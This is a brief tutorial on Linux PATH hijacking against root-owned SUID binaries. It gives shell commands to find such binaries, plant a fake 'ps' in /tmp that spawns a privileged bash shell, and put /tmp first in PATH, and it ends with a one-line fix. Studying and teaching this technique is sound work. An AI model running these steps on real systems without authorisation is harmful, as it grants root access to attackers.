**PATH hijacking** happens when a program running as **root** (via **SUID**) calls a system command like `ps` instead of using its full path (`/usr/bin/ps`). Linux searches the directories listed in your **`$PATH`** variable from left to right—so if you put a writable folder first, Linux executes _your_ payload instead.

### The 4-Step Exploit Flow

1. **Find a vulnerable binary:** Look for **SUID** binaries running with **root** ownership.    
``` bash
find / -user root -perm -4000 -type f 2>/dev/null # Finds root-owned SUID binaries
```

2. **Create your payload:** Build a executable script in **/tmp** named after the target command (e.g., `ps`).

```bash
echo '/bin/bash -p' > /tmp/ps && chmod +x /tmp/ps # Spawns a privileged shell
```

3. **Hijack `$PATH`:** Put **/tmp** at the very beginning of your **`$PATH`** variable.

```bash
export PATH=/tmp:$PATH # Forces Linux to search /tmp before /usr/bin
```

4. **Run the target:** Execute the vulnerable SUID program. When it calls `ps`, it executes **/tmp/ps** as root instead of `/usr/bin/ps`.

**The Fix:** Hardcode full paths in code (use `/usr/bin/ps` instead of `ps`) or sanitize **`$PATH`** inside the code using `setenv()`.